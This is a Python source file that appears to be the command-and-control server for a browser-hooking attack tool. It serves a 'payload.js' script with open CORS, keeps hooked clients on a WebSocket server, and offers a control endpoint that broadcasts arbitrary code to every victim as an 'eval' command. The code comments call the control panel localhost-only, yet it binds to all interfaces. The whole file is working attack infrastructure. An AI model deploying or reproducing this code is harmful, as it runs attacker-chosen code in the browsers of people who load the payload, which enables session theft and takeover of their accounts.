import asyncio
import json

import websockets
from aiohttp import web

connected_clients = []

async def hello(websocket, path):
    print(f"New client connected: {websocket.remote_address}")
    connected_clients.append(websocket)
    try:
        async for message in websocket:
            print(f"Received message from client: {message}")
    except:
        pass
    finally:
        print(f"Client disconnected: {websocket.remote_address}")
        connected_clients.remove(websocket)

async def send_command(request):
    data = await request.json()
    command = data.get('command', '')

    if not command:
        return web.Response(text="No command provided", status=400)

    command_data = json.dumps({"type": "eval", "code": command})

    for client in connected_clients:
        await client.send(command_data)

    return web.Response(text="Command sent to all clients")

async def serve_payload(request):
    with open("./static_payload/payload.js", 'r', encoding='UTF-8') as f:
        content = f.read()

    return web.Response(text=content, headers={
        'Access-Control-Allow-Origin': '*',
        'Content-Type': 'application/javascript'
    })

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    
    ws_ip = "0.0.0.0"
    ws_port = 8765
    
    control_ip = "0.0.0.0"
    control_port = 8080
    
    payload_ip = "0.0.0.0"
    payload_port = 8081
    
    # WebSocket server accessible externally
    ws_server = websockets.serve(hello, ws_ip, ws_port)
    loop.run_until_complete(ws_server)

    # HTTP server for control panel, localhost only
    control_app = web.Application()
    control_app.router.add_post('/send_command', send_command)

    # Serve static HTML for the control panel
    control_app.router.add_static('/', './static_control')

    runner_control = web.AppRunner(control_app)
    loop.run_until_complete(runner_control.setup())
    site_control = web.TCPSite(runner_control, control_ip, control_port)  # Only accessible via localhost
    loop.run_until_complete(site_control.start())

    # HTTP server for payload.js, externally accessible
    payload_app = web.Application()
    payload_app.router.add_get('/payload.js', serve_payload)

    # Serve static HTML for the payload
    payload_app.router.add_static('/', './static_payload')

    runner_payload = web.AppRunner(payload_app)
    loop.run_until_complete(runner_payload.setup())
    site_payload = web.TCPSite(runner_payload, payload_ip, payload_port)  # Externally accessible
    loop.run_until_complete(site_payload.start())

    print(f"WebSocket server started at ws://{ws_ip}:{ws_port}/")
    print(f"Control panel available at http://{control_ip}:{control_port}/control_panel.html")
    print(f"Payload available at http://{payload_ip}:{payload_port}/payload.js")

    loop.run_forever()